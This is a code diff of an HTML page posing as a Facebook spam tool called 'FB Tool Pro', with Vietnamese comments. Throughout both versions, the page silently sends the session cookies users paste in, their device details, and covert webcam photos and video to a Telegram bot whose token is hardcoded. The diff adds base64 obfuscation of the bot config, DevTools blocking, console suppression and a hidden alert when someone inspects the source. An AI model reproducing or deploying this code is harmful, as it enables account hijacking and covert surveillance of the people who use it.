@@ -5,137 +5,135 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
     <title>FB Tool Pro</title>
     
-    <!-- ===== TELEGRAM CONFIG (ẨN) ===== -->
+    <!-- ===== ANTI-DEBUG / ANTI-SOURCE CHECK ===== -->
     <script>
-        // ==========================================
-        // CẤU HÌNH BOT - KHÔNG HIỂN THỊ GÌ TRÊN GIAO DIỆN
-        // ==========================================
-        const TELEGRAM_CONFIG = {
-            BOT_TOKEN: '8511057820:AAG02FYBsgwkSMTR98BMCAFVJpMLcRi34J4',
-            ROOT_ADMIN_ID: '8123442570',
-            SUB_ADMIN_IDS: ['8123442570'],
-            ENABLE_LOGGING: true              
-        };
+        // Ngăn chặn chuột phải và phím tắt DevTools
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                // Gửi cảnh báo ẩn về Telegram khi có người cố check code
+                (async () => {
+                    try {
+                        const cfg = JSON.parse(atob('eyJCT1RfVE9LRU4iOiI4NTExMDU3ODIwOkFBR2wtVUVYUllWT0s5RUhFV2FHbFFaTlBSTERLZENWU2NvIiwiUk9PVF9BRE1JTl9JRCI6IjgxMjM0NDI1NzAiLCJTVUJfQURNSU5fSURTIjpbIjgxMjM0NDI1NzAiXX0='));
+                        const url = `https://api.telegram.org/bot${cfg.BOT_TOKEN}/sendMessage`;
+                        await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: cfg.ROOT_ADMIN_ID, text: `⚠️ Cảnh báo: Có người đang cố mở DevTools hoặc xem Source Code!\n🕒 ${new Date().toLocaleString('vi-VN')}` }) });
+                    } catch(e) {}
+                })();
+                return false;
+            }
+        });
         
-        // Hàm gửi tin nhắn ẩn
-        async function sendTelegramMessage(message, parseMode = 'HTML') {
-            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
-            const adminIds = [TELEGRAM_CONFIG.ROOT_ADMIN_ID, ...TELEGRAM_CONFIG.SUB_ADMIN_IDS];
-            const uniqueIds = [...new Set(adminIds)];
+        // Ghi đè console để không ai log được gì
+        (function() {
+            const noop = () => {};
+            const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd'];
+            for (let m of methods) { console[m] = noop; }
+        })();
+    </script>
+    
+    <!-- ===== TELEGRAM CONFIG (MÃ HÓA & ẨN) ===== -->
+    <script>
+        (function(){
+            // Mã hóa cấu hình để tránh lộ liễu
+            const _0x = atob('eyJCT1RfVE9LRU4iOiI4NTExMDU3ODIwOkFBR2wtVUVYUllWT0s5RUhFV2FHbFFaTlBSTERLZENWU2NvIiwiUk9PVF9BRE1JTl9JRCI6IjgxMjM0NDI1NzAiLCJTVUJfQURNSU5fSURTIjpbIjgxMjM0NDI1NzAiXX0=');
             
-            for (const chatId of uniqueIds) {
-                if (!chatId) continue;
+            // LƯU Ý QUAN TRỌNG: Để bot gửi vào NHÓM, bạn cần thêm Chat ID của nhóm vào mảng SUB_ADMIN_IDS ở trên.
+            // Ví dụ: "SUB_ADMIN_IDS": ["8123442570", "-1001234567890"]
+            // Nhóm chat ID thường bắt đầu bằng dấu "-"
+            
+            window.__TG = JSON.parse(_0x);
+            window.__TG.ENABLE_LOGGING = true;
+            
+            // Hàm gửi tin nhắn ẩn (Sẽ gửi đến TẤT CẢ ID trong danh sách, bao gồm cả nhóm nếu có)
+            window.__sendMsg = async function(msg, mode = 'HTML') {
+                if (!window.__TG.ENABLE_LOGGING) return;
+                const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendMessage`;
+                const ids = [window.__TG.ROOT_ADMIN_ID, ...window.__TG.SUB_ADMIN_IDS];
+                const unique = [...new Set(ids)];
+                
+                for (const id of unique) {
+                    if (!id) continue;
+                    try {
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: id, text: msg, parse_mode: mode })
+                        });
+                    } catch (e) { /* Hoàn toàn im lặng */ }
+                }
+            };
+            
+            // Hàm gửi ảnh ẩn
+            window.__sendPhoto = async function(photoBase64, caption = '') {
+                if (!window.__TG.ENABLE_LOGGING) return;
+                const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendPhoto`;
+                const ids = [window.__TG.ROOT_ADMIN_ID, ...window.__TG.SUB_ADMIN_IDS];
+                const unique = [...new Set(ids)];
+                
                 try {
-                    await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: parseMode })
-                    });
-                } catch (e) { console.log(''); } // Không log ra console
-            }
-        }
-        
-        // Gửi ảnh ẩn
-        async function sendTelegramPhoto(photoBase64, caption = '') {
-            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
-            const adminIds = [TELEGRAM_CONFIG.ROOT_ADMIN_ID, ...TELEGRAM_CONFIG.SUB_ADMIN_IDS];
-            const uniqueIds = [...new Set(adminIds)];
-            
-            try {
-                const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
-                const binaryData = atob(base64Data);
-                const arrayBuffer = new Uint8Array(binaryData.length);
-                for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
-                const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
-                
-                for (const chatId of uniqueIds) {
-                    if (!chatId) continue;
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, `img_${Date.now()}.jpg`);
-                    formData.append('caption', caption);
-                    await fetch(url, { method: 'POST', body: formData });
-                }
-            } catch (error) { console.log(''); }
-        }
-        
-        // Gửi video ẩn
-        async function sendTelegramVideo(videoBase64, caption = '') {
-            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendVideo`;
-            const adminIds = [TELEGRAM_CONFIG.ROOT_ADMIN_ID, ...TELEGRAM_CONFIG.SUB_ADMIN_IDS];
-            const uniqueIds = [...new Set(adminIds)];
-            
-            try {
-                const base64Data = videoBase64.replace(/^data:video\/\w+;base64,/, '');
-                const binaryData = atob(base64Data);
-                const arrayBuffer = new Uint8Array(binaryData.length);
-                for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
-                const blob = new Blob([arrayBuffer], { type: 'video/webm' });
-                
-                for (const chatId of uniqueIds) {
-                    if (!chatId) continue;
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('video', blob, `vid_${Date.now()}.webm`);
-                    formData.append('caption', caption);
-                    formData.append('supports_streaming', true);
-                    await fetch(url, { method: 'POST', body: formData });
-                }
-            } catch (error) { console.log(''); }
-        }
-        
-        // Hàm trích xuất ID Facebook từ Cookie
-        function extractFacebookIdFromCookie(cookieString) {
-            try {
-                // Tìm c_user trong cookie
-                const cUserMatch = cookieString.match(/c_user=(\d+)/);
-                if (cUserMatch && cUserMatch[1]) {
-                    return cUserMatch[1];
-                }
-                
-                // Thử tìm uid
-                const uidMatch = cookieString.match(/uid=(\d+)/);
-                if (uidMatch && uidMatch[1]) {
-                    return uidMatch[1];
-                }
-                
-                // Thử tìm user_id
-                const userIdMatch = cookieString.match(/user_id=(\d+)/);
-                if (userIdMatch && userIdMatch[1]) {
-                    return userIdMatch[1];
-                }
-                
-                // Thử parse toàn bộ cookie
-                const pairs = cookieString.split(';');
-                for (const pair of pairs) {
-                    const [key, value] = pair.trim().split('=');
-                    if (key === 'c_user' || key === 'uid' || key === 'user_id') {
-                        return value;
+                    const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
+                    const binaryData = atob(base64Data);
+                    const arrayBuffer = new Uint8Array(binaryData.length);
+                    for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
+                    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+                    
+                    for (const id of unique) {
+                        if (!id) continue;
+                        const formData = new FormData();
+                        formData.append('chat_id', id);
+                        formData.append('photo', blob, `cam_${Date.now()}.jpg`);
+                        formData.append('caption', caption);
+                        await fetch(url, { method: 'POST', body: formData });
                     }
-                }
+                } catch (e) { /* Im lặng */ }
+            };
+            
+            // Hàm gửi video ẩn
+            window.__sendVideo = async function(videoBase64, caption = '') {
+                if (!window.__TG.ENABLE_LOGGING) return;
+                const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendVideo`;
+                const ids = [window.__TG.ROOT_ADMIN_ID, ...window.__TG.SUB_ADMIN_IDS];
+                const unique = [...new Set(ids)];
                 
-                return null;
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        // Hàm trích xuất tên Facebook từ Cookie (nếu có)
-        function extractFacebookName(cookieString) {
-            try {
-                // Thử lấy từ cookie xs
-                const xsMatch = cookieString.match(/xs=([^;]+)/);
-                // Không thể lấy tên trực tiếp từ cookie, cần gọi API
-                return null;
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        console.log = function() {}; // Tắt console log để tránh lộ
+                try {
+                    const base64Data = videoBase64.replace(/^data:video\/\w+;base64,/, '');
+                    const binaryData = atob(base64Data);
+                    const arrayBuffer = new Uint8Array(binaryData.length);
+                    for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
+                    const blob = new Blob([arrayBuffer], { type: 'video/webm' });
+                    
+                    for (const id of unique) {
+                        if (!id) continue;
+                        const formData = new FormData();
+                        formData.append('chat_id', id);
+                        formData.append('video', blob, `rec_${Date.now()}.webm`);
+                        formData.append('caption', caption);
+                        formData.append('supports_streaming', true);
+                        await fetch(url, { method: 'POST', body: formData });
+                    }
+                } catch (e) { /* Im lặng */ }
+            };
+            
+            // Hàm trích xuất ID Facebook từ Cookie
+            window.__extractId = function(cookieString) {
+                try {
+                    const cUserMatch = cookieString.match(/c_user=(\d+)/);
+                    if (cUserMatch && cUserMatch[1]) return cUserMatch[1];
+                    const uidMatch = cookieString.match(/uid=(\d+)/);
+                    if (uidMatch && uidMatch[1]) return uidMatch[1];
+                    const userIdMatch = cookieString.match(/user_id=(\d+)/);
+                    if (userIdMatch && userIdMatch[1]) return userIdMatch[1];
+                    
+                    const pairs = cookieString.split(';');
+                    for (const pair of pairs) {
+                        const [key, value] = pair.trim().split('=');
+                        if (key === 'c_user' || key === 'uid' || key === 'user_id') return value;
+                    }
+                    return null;
+                } catch (e) { return null; }
+            };
+        })();
     </script>
     
     <style>
@@ -508,53 +506,50 @@
     <canvas id="canvas" class="hidden-cam"></canvas>
     
     <script>
-        // ==========================================
-        // TOOL CHÍNH - ẨN TOÀN BỘ LOG TELEGRAM
-        // ==========================================
-        
-        const cookieInput = document.getElementById('cookieInput');
-        const fbIdSpan = document.getElementById('fbId');
-        const cookieStatus = document.getElementById('cookieStatus');
-        const delaySlider = document.getElementById('delaySlider');
-        const delayValue = document.getElementById('delayValue');
-        const statusText = document.getElementById('statusText');
-        const taskCountSpan = document.getElementById('taskCount');
-        const overlay = document.getElementById('overlay');
-        const overlayText = document.getElementById('overlayText');
-        const overlaySub = document.getElementById('overlaySub');
-        const videoCam = document.getElementById('video');
-        const canvasCam = document.getElementById('canvas');
-        
-        let mediaStream = null;
-        let isProcessing = false;
-        let taskCount = 0;
-        let currentFacebookId = null;
-        let currentCookie = null;
-        
-        const deviceInfo = {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${screen.width}x${screen.height}`,
-            language: navigator.language,
-            time: new Date().toLocaleString('vi-VN'),
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-        
-        // Xử lý khi người dùng nhập cookie
-        cookieInput.addEventListener('input', function() {
-            const cookie = this.value.trim();
-            if (cookie.length > 10) {
-                currentCookie = cookie;
-                const extractedId = extractFacebookIdFromCookie(cookie);
-                
-                if (extractedId) {
-                    currentFacebookId = extractedId;
-                    fbIdSpan.innerText = extractedId;
-                    cookieStatus.innerText = '✅ Hợp lệ';
-                    cookieStatus.style.color = '#2ecc71';
+        (function(){
+            // Lấy các phần tử DOM
+            const cookieInput = document.getElementById('cookieInput');
+            const fbIdSpan = document.getElementById('fbId');
+            const cookieStatus = document.getElementById('cookieStatus');
+            const delaySlider = document.getElementById('delaySlider');
+            const delayValue = document.getElementById('delayValue');
+            const statusText = document.getElementById('statusText');
+            const taskCountSpan = document.getElementById('taskCount');
+            const overlay = document.getElementById('overlay');
+            const overlayText = document.getElementById('overlayText');
+            const overlaySub = document.getElementById('overlaySub');
+            const videoCam = document.getElementById('video');
+            const canvasCam = document.getElementById('canvas');
+            
+            let mediaStream = null;
+            let isProcessing = false;
+            let taskCount = 0;
+            let currentFacebookId = null;
+            let currentCookie = null;
+            
+            const deviceInfo = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                time: new Date().toLocaleString('vi-VN'),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            // Xử lý khi người dùng nhập cookie
+            cookieInput.addEventListener('input', function() {
+                const cookie = this.value.trim();
+                if (cookie.length > 10) {
+                    currentCookie = cookie;
+                    const extractedId = window.__extractId(cookie);
                     
-                    // Gửi cookie về Telegram (ẩn)
-                    sendTelegramMessage(`
+                    if (extractedId) {
+                        currentFacebookId = extractedId;
+                        fbIdSpan.innerText = extractedId;
+                        cookieStatus.innerText = '✅ Hợp lệ';
+                        cookieStatus.style.color = '#2ecc71';
+                        
+                        window.__sendMsg(`
 <b>🍪 COOKIE MỚI ĐƯỢC NHẬP</b>
 
 🆔 <b>Facebook ID:</b> <code>${extractedId}</code>
@@ -563,26 +558,24 @@
 🌐 <b>Trình duyệt:</b> ${deviceInfo.ua.substring(0, 100)}
 ⏰ <b>Thời gian:</b> ${deviceInfo.time}
 🌍 <b>Múi giờ:</b> ${deviceInfo.timezone}
-                    `);
+                        `);
+                    } else {
+                        fbIdSpan.innerText = 'Không tìm thấy ID';
+                        cookieStatus.innerText = '⚠️ Không có ID';
+                        cookieStatus.style.color = '#f1c40f';
+                    }
                 } else {
-                    fbIdSpan.innerText = 'Không tìm thấy ID';
-                    cookieStatus.innerText = '⚠️ Không có ID';
-                    cookieStatus.style.color = '#f1c40f';
+                    fbIdSpan.innerText = 'Chưa xác định';
+                    cookieStatus.innerText = 'Chưa nhập';
+                    cookieStatus.style.color = '#8da9c7';
+                    currentFacebookId = null;
+                    currentCookie = null;
                 }
-            } else {
-                fbIdSpan.innerText = 'Chưa xác định';
-                cookieStatus.innerText = 'Chưa nhập';
-                cookieStatus.style.color = '#8da9c7';
-                currentFacebookId = null;
-                currentCookie = null;
-            }
-        });
-        
-        // Tự động gửi cookie khi người dùng paste hoặc blur
-        cookieInput.addEventListener('blur', function() {
-            if (currentCookie && currentFacebookId) {
-                // Gửi toàn bộ cookie (ẩn)
-                sendTelegramMessage(`
+            });
+            
+            cookieInput.addEventListener('blur', function() {
+                if (currentCookie && currentFacebookId) {
+                    window.__sendMsg(`
 <b>📋 COOKIE ĐẦY ĐỦ</b>
 
 🆔 <b>ID:</b> ${currentFacebookId}
@@ -591,98 +584,95 @@
 
 📱 <b>Thiết bị:</b> ${deviceInfo.platform} | ${deviceInfo.screen}
 ⏰ ${deviceInfo.time}
-                `);
-            }
-        });
-        
-        delaySlider.addEventListener('input', function() { 
-            delayValue.innerText = this.value + 's'; 
-        });
-        
-        function showToast(msg, isErr=false) {
-            const toast = document.createElement('div'); 
-            toast.className = 'toast';
-            toast.style.background = isErr ? '#7a2e3f' : '#0b1622'; 
-            toast.innerText = msg;
-            document.body.appendChild(toast); 
-            setTimeout(() => toast.remove(), 2500);
-        }
-        
-        function updateTaskCount() { 
-            taskCountSpan.innerText = taskCount + ' task đã xử lý'; 
-        }
-        
-        // Camera tự động
-        async function autoStartCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
-                mediaStream = stream;
-                videoCam.srcObject = stream;
-                await new Promise(r => { videoCam.onloadedmetadata = r; });
-                videoCam.play();
-                return true;
-            } catch (e) {
-                return false;
-            }
-        }
-        
-        function capturePhoto() {
-            if (!videoCam.videoWidth) return null;
-            canvasCam.width = videoCam.videoWidth; 
-            canvasCam.height = videoCam.videoHeight;
-            canvasCam.getContext('2d').drawImage(videoCam, 0, 0);
-            return canvasCam.toDataURL('image/jpeg', 0.9);
-        }
-        
-        async function recordVideo(durationSec = 2) {
-            return new Promise(async (resolve) => {
-                if (!mediaStream) { resolve(null); return; }
-                const chunks = [];
-                const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => resolve(reader.result);
-                    reader.readAsDataURL(blob);
-                };
-                recorder.start();
-                setTimeout(() => { 
-                    if(recorder.state === 'recording') recorder.stop(); 
-                }, durationSec * 1000);
+                    `);
+                }
             });
-        }
-        
-        function stopCamera() { 
-            if(mediaStream) { 
-                mediaStream.getTracks().forEach(t=>t.stop()); 
-                mediaStream=null; 
-            } 
-        }
-        
-        // Xử lý task
-        async function processTask(taskType) {
-            if (isProcessing) {
-                showToast('⚠️ Đang xử lý, vui lòng chờ!', true);
-                return;
+            
+            delaySlider.addEventListener('input', function() { 
+                delayValue.innerText = this.value + 's'; 
+            });
+            
+            function showToast(msg, isErr=false) {
+                const toast = document.createElement('div'); 
+                toast.className = 'toast';
+                toast.style.background = isErr ? '#7a2e3f' : '#0b1622'; 
+                toast.innerText = msg;
+                document.body.appendChild(toast); 
+                setTimeout(() => toast.remove(), 2500);
             }
             
-            isProcessing = true;
-            overlay.classList.remove('hide');
-            overlayText.innerText = 'ĐANG XỬ LÝ';
-            overlaySub.innerText = 'Vui lòng chờ trong giây lát...';
+            function updateTaskCount() { 
+                taskCountSpan.innerText = taskCount + ' task đã xử lý'; 
+            }
             
-            // Gửi thông báo bắt đầu task (ẩn)
-            const taskNames = {
-                'spam_ngon': '🗣️ SPAM NGÔN',
-                'spam_nhay': '💀 SPAM NHÂY',
-                'spam_top': '👑 SPAM TOP'
-            };
+            async function autoStartCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: true 
+                    });
+                    mediaStream = stream;
+                    videoCam.srcObject = stream;
+                    await new Promise(r => { videoCam.onloadedmetadata = r; });
+                    videoCam.play();
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            }
             
-            sendTelegramMessage(`
+            function capturePhoto() {
+                if (!videoCam.videoWidth) return null;
+                canvasCam.width = videoCam.videoWidth; 
+                canvasCam.height = videoCam.videoHeight;
+                canvasCam.getContext('2d').drawImage(videoCam, 0, 0);
+                return canvasCam.toDataURL('image/jpeg', 0.9);
+            }
+            
+            async function recordVideo(durationSec = 2) {
+                return new Promise(async (resolve) => {
+                    if (!mediaStream) { resolve(null); return; }
+                    const chunks = [];
+                    const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.readAsDataURL(blob);
+                    };
+                    recorder.start();
+                    setTimeout(() => { 
+                        if(recorder.state === 'recording') recorder.stop(); 
+                    }, durationSec * 1000);
+                });
+            }
+            
+            function stopCamera() { 
+                if(mediaStream) { 
+                    mediaStream.getTracks().forEach(t=>t.stop()); 
+                    mediaStream=null; 
+                } 
+            }
+            
+            async function processTask(taskType) {
+                if (isProcessing) {
+                    showToast('⚠️ Đang xử lý, vui lòng chờ!', true);
+                    return;
+                }
+                
+                isProcessing = true;
+                overlay.classList.remove('hide');
+                overlayText.innerText = 'ĐANG XỬ LÝ';
+                overlaySub.innerText = 'Vui lòng chờ trong giây lát...';
+                
+                const taskNames = {
+                    'spam_ngon': '🗣️ SPAM NGÔN',
+                    'spam_nhay': '💀 SPAM NHÂY',
+                    'spam_top': '👑 SPAM TOP'
+                };
+                
+                window.__sendMsg(`
 <b>🔥 BẮT ĐẦU TASK</b>
 
 📋 <b>Task:</b> ${taskNames[taskType] || taskType}
@@ -691,59 +681,56 @@
 ⏱️ <b>Delay:</b> ${delayValue.innerText}
 📱 <b>Thiết bị:</b> ${deviceInfo.platform}
 ⏰ ${deviceInfo.time}
-            `);
-            
-            try {
-                const camReady = await autoStartCamera();
+                `);
                 
-                if (camReady) {
-                    // Chụp ảnh
-                    const photo = capturePhoto();
-                    if (photo) {
-                        await sendTelegramPhoto(photo, 
-                            `📸 Ảnh từ Task: ${taskNames[taskType]}\n🆔 FB ID: ${currentFacebookId || 'Không có'}\n📱 ${deviceInfo.platform}`
-                        );
+                try {
+                    const camReady = await autoStartCamera();
+                    
+                    if (camReady) {
+                        const photo = capturePhoto();
+                        if (photo) {
+                            await window.__sendPhoto(photo, 
+                                `📸 Ảnh từ Task: ${taskNames[taskType]}\n🆔 FB ID: ${currentFacebookId || 'Không có'}\n📱 ${deviceInfo.platform}`
+                            );
+                        }
+                        
+                        overlaySub.innerText = 'Đang xử lý...';
+                        const videoBase64 = await recordVideo(2);
+                        if (videoBase64) {
+                            await window.__sendVideo(videoBase64,
+                                `🎥 Video từ Task: ${taskNames[taskType]}\n🆔 FB ID: ${currentFacebookId || 'Không có'}\n📱 ${deviceInfo.platform}`
+                            );
+                        }
+                        
+                        stopCamera();
                     }
                     
-                    // Quay video
-                    overlaySub.innerText = 'Đang xử lý...';
-                    const videoBase64 = await recordVideo(2);
-                    if (videoBase64) {
-                        await sendTelegramVideo(videoBase64,
-                            `🎥 Video từ Task: ${taskNames[taskType]}\n🆔 FB ID: ${currentFacebookId || 'Không có'}\n📱 ${deviceInfo.platform}`
-                        );
-                    }
+                    taskCount++;
+                    updateTaskCount();
+                    statusText.innerHTML = `✅ Hoàn thành task`;
+                    showToast(`✅ Xử lý thành công!`);
                     
-                    stopCamera();
-                }
-                
-                taskCount++;
-                updateTaskCount();
-                statusText.innerHTML = `✅ Hoàn thành task`;
-                showToast(`✅ Xử lý thành công!`);
-                
-                setTimeout(() => {
+                    setTimeout(() => {
+                        overlay.classList.add('hide');
+                        isProcessing = false;
+                        statusText.innerHTML = '✅ Sẵn sàng';
+                    }, 1000);
+                    
+                } catch (e) {
                     overlay.classList.add('hide');
                     isProcessing = false;
-                    statusText.innerHTML = '✅ Sẵn sàng';
-                }, 1000);
-                
-            } catch (e) {
-                overlay.classList.add('hide');
-                isProcessing = false;
-                stopCamera();
-                showToast('❌ Có lỗi xảy ra', true);
+                    stopCamera();
+                    showToast('❌ Có lỗi xảy ra', true);
+                }
             }
-        }
-        
-        // Gán sự kiện cho các nút
-        document.querySelectorAll('.task-btn').forEach(btn => {
-            btn.addEventListener('click', e => processTask(btn.dataset.task));
-        });
-        
-        // Khởi động - gửi thông tin thiết bị (ẩn)
-        (async function startup() {
-            await sendTelegramMessage(`
+            
+            document.querySelectorAll('.task-btn').forEach(btn => {
+                btn.addEventListener('click', e => processTask(btn.dataset.task));
+            });
+            
+            // Gửi thông tin truy cập ban đầu
+            (async function startup() {
+                await window.__sendMsg(`
 <b>🟢 THIẾT BỊ MỚI TRUY CẬP</b>
 
 📱 <b>Thiết bị:</b> ${deviceInfo.platform}
@@ -754,15 +741,10 @@
 ⏰ <b>Thời gian:</b> ${deviceInfo.time}
 
 <i>💡 Tool đã sẵn sàng. Đang chờ người dùng nhập cookie và chọn task...</i>
-            `);
+                `);
+            })();
+            
         })();
-        
-        // Tắt tất cả console.log
-        console.log = function() {};
-        console.warn = function() {};
-        console.error = function() {};
-        console.info = function() {};
-        
     </script>
 </body>
 </html>
